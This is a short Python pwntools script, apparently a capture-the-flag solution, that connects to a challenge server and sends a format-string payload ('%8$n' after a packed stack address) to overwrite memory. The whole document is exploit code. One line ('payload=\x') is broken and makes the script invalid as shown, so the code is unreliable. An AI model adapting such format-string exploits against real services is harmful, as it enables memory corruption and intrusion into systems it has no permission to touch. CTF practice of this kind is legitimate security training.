from pwn import *

p = remote('shell.actf.co', 19011)
postpayload = '%8$n'
payload='\x68\xde\xff\xff\xff\x7f\x41\x00'+postpayload
payload=\x
print p.recvuntil('? ')
p.sendline(payload)
print p.recvline()
